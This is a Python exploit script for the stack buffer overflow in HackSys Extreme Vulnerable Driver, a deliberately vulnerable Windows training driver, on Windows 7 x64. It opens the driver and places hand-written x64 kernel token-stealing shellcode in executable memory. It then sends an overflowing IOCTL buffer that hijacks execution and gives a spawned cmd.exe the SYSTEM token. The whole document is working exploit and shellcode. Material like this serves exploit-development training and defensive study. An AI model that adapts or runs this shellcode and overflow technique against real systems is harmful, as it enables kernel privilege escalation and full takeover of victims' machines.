# HackSys Extreme Vulnerable Driver
# Stack buffer overflow exploit
# Target: Windows 7 SP1 64-bit
# Author: Brian Beaudry

from ctypes import *
from ctypes.wintypes import *
import sys, struct, time

# Define constants
CREATE_NEW_CONSOLE = 0x00000010
GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
FILE_DEVICE_UNKNOWN = 0x00000022
FILE_ANY_ACCESS = 0x00000000
METHOD_NEITHER = 0x00000003
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
HANDLE = c_void_p
LPTSTR = c_void_p
LPBYTE = c_char_p

# Define WinAPI shorthand
CreateProcess = windll.kernel32.CreateProcessW # <-- Unicode version!
VirtualAlloc = windll.kernel32.VirtualAlloc
CreateFile = windll.kernel32.CreateFileW # <-- Unicode version!
DeviceIoControl = windll.kernel32.DeviceIoControl

class STARTUPINFO(Structure):
    """STARTUPINFO struct for CreateProcess API"""

    _fields_ = [("cb", DWORD),
                ("lpReserved", LPTSTR),
                ("lpDesktop", LPTSTR),
                ("lpTitle", LPTSTR),
                ("dwX", DWORD),
                ("dwY", DWORD),
                ("dwXSize", DWORD),
                ("dwYSize", DWORD),
                ("dwXCountChars", DWORD),
                ("dwYCountChars", DWORD),
                ("dwFillAttribute", DWORD),
                ("dwFlags", DWORD),
                ("wShowWindow", WORD),
                ("cbReserved2", WORD),
                ("lpReserved2", LPBYTE),
                ("hStdInput", HANDLE),
                ("hStdOutput", HANDLE),
                ("hStdError", HANDLE)]

class PROCESS_INFORMATION(Structure):
    """PROCESS_INFORMATION struct for CreateProcess API"""

    _fields_ = [("hProcess", HANDLE),
                ("hThread", HANDLE),
                ("dwProcessId", DWORD),
                ("dwThreadId", DWORD)]

def procreate():
    """Spawn shell and return PID"""

    print "[*]Spawning shell..."
    lpApplicationName = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpCommandLine = u"c:\\windows\\system32\\cmd.exe" # Unicode
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = 0
    dwCreationFlags = CREATE_NEW_CONSOLE
    lpEnvironment = None
    lpCurrentDirectory = None
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()
    
    ret = CreateProcess(lpApplicationName,           # _In_opt_      LPCTSTR
                        lpCommandLine,               # _Inout_opt_   LPTSTR
                        lpProcessAttributes,         # _In_opt_      LPSECURITY_ATTRIBUTES
                        lpThreadAttributes,          # _In_opt_      LPSECURITY_ATTRIBUTES
                        bInheritHandles,             # _In_          BOOL
                        dwCreationFlags,             # _In_          DWORD
                        lpEnvironment,               # _In_opt_      LPVOID
                        lpCurrentDirectory,          # _In_opt_      LPCTSTR
                        byref(lpStartupInfo),        # _In_          LPSTARTUPINFO
                        byref(lpProcessInformation)) # _Out_         LPPROCESS_INFORMATION
    if not ret:
        print "\t[-]Error spawning shell: " + FormatError()
        sys.exit(-1)

    time.sleep(1) # Make sure cmd.exe spawns fully before shellcode executes

    print "\t[+]Spawned with PID: %d" % lpProcessInformation.dwProcessId
    return lpProcessInformation.dwProcessId

def gethandle():
    """Open handle to driver and return it"""

    print "[*]Getting device handle..."
    lpFileName = u"\\\\.\\HacksysExtremeVulnerableDriver"
    dwDesiredAccess = GENERIC_READ | GENERIC_WRITE
    dwShareMode = 0
    lpSecurityAttributes = None
    dwCreationDisposition = OPEN_EXISTING
    dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
    hTemplateFile = None

    handle = CreateFile(lpFileName,             # _In_     LPCTSTR
                        dwDesiredAccess,        # _In_     DWORD
                        dwShareMode,            # _In_     DWORD
                        lpSecurityAttributes,   # _In_opt_ LPSECURITY_ATTRIBUTES
                        dwCreationDisposition,  # _In_     DWORD
                        dwFlagsAndAttributes,   # _In_     DWORD
                        hTemplateFile)          # _In_opt_ HANDLE

    if not handle or handle == -1:
        print "\t[-]Error getting device handle: " + FormatError()
        sys.exit(-1)
        
    print "\t[+]Got device handle: 0x%x" % handle
    return handle

def ctl_code(function,
             devicetype = FILE_DEVICE_UNKNOWN,
             access = FILE_ANY_ACCESS,
             method = METHOD_NEITHER):
    """Recreate CTL_CODE macro to generate driver IOCTL"""
    return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def shellcode(pid):
    """Craft our shellcode and stick it in a buffer"""

    tokenstealing = (
        # Windows 7 x64 token stealing shellcode
        # based on http://mcdermottcybersecurity.com/articles/x64-kernel-privilege-escalation

                                                  #start:
        "\x65\x48\x8B\x14\x25\x88\x01\x00\x00"    #    mov rdx, [gs:188h]   ;KTHREAD pointer
        "\x4C\x8B\x42\x70"                        #    mov r8, [rdx+70h]    ;EPROCESS pointer
        "\x4D\x8B\x88\x88\x01\x00\x00"            #    mov r9, [r8+188h]    ;ActiveProcessLinks list head
        "\x49\x8B\x09"                            #    mov rcx, [r9]        ;follow link to first process in list
                                                  #find_system:
        "\x48\x8B\x51\xF8"                        #    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
        "\x48\x83\xFA\x04"                        #    cmp rdx, 4           ;UniqueProcessId == 4? 
        "\x74\x05"                                #    jz found_system      ;YES - move on
        "\x48\x8B\x09"                            #    mov rcx, [rcx]       ;NO - load next entry in list
        "\xEB\xF1"                                #    jmp find_system      ;loop
                                                  #found_system:
        "\x48\x8B\x81\x80\x00\x00\x00"            #    mov rax, [rcx+80h]   ;offset to token
        "\x24\xF0"                                #    and al, 0f0h         ;clear low 4 bits of _EX_FAST_REF structure
                                                  #find_cmd:
        "\x48\x8B\x51\xF8"                        #    mov rdx, [rcx-8]     ;ActiveProcessLinks - 8 = UniqueProcessId
        "\x48\x81\xFA" + struct.pack("<I",pid) +  #    cmp rdx, ZZZZ        ;UniqueProcessId == ZZZZ? (PLACEHOLDER)
        "\x74\x05"                                #    jz found_cmd         ;YES - move on
        "\x48\x8B\x09"                            #    mov rcx, [rcx]       ;NO - next entry in list
        "\xEB\xEE"                                #    jmp find_cmd         ;loop
                                                  #found_cmd:
        "\x48\x89\x81\x80\x00\x00\x00"            #    mov [rcx+80h], rax   ;copy SYSTEM token over top of this process's token
                                                  #return:
        "\x48\x83\xC4\x28"                        #    add rsp, 28h         ;HEVD+0x61ea
        "\xC3")                                   #    ret

    print "[*]Allocating buffer for shellcode..."
    lpAddress = None
    dwSize = len(tokenstealing)
    flAllocationType = (MEM_COMMIT | MEM_RESERVE)
    flProtect = PAGE_EXECUTE_READWRITE
    
    addr = VirtualAlloc(lpAddress,         # _In_opt_  LPVOID
                        dwSize,            # _In_      SIZE_T
                        flAllocationType,  # _In_      DWORD
                        flProtect)         # _In_      DWORD
    if not addr:
        print "\t[-]Error allocating shellcode: " + FormatError()
        sys.exit(-1)

    print "\t[+]Shellcode buffer allocated at: 0x%x" % addr
    
    # put de shellcode in de buffer and shake it all up
    memmove(addr, tokenstealing, len(tokenstealing))
    return addr

def trigger(hDevice, dwIoControlCode, scAddr):
    """Create evil buffer and send IOCTL"""

    inBuffer = create_string_buffer("A" * 2056 + struct.pack("<Q", scAddr))

    print "[*]Triggering vulnerable IOCTL..."
    lpInBuffer = addressof(inBuffer)
    nInBufferSize = len(inBuffer)-1 # ignore terminating \x00
    lpOutBuffer = None
    nOutBufferSize = 0
    lpBytesReturned = byref(c_ulong())
    lpOverlapped = None
    
    pwnd = DeviceIoControl(hDevice,             # _In_        HANDLE
                           dwIoControlCode,     # _In_        DWORD
                           lpInBuffer,          # _In_opt_    LPVOID
                           nInBufferSize,       # _In_        DWORD
                           lpOutBuffer,         # _Out_opt_   LPVOID
                           nOutBufferSize,      # _In_        DWORD
                           lpBytesReturned,     # _Out_opt_   LPDWORD
                           lpOverlapped)        # _Inout_opt_ LPOVERLAPPED
    if not pwnd:
        print "\t[-]Error: Not pwnd :(\n" + FormatError()
        sys.exit(-1)

if __name__ == "__main__":
    print "\n**HackSys Extreme Vulnerable Driver**"
    print "***Stack buffer overflow exploit***\n"

    pid = procreate()
    trigger(gethandle(), ctl_code(0x800), shellcode(pid)) # ugly lol
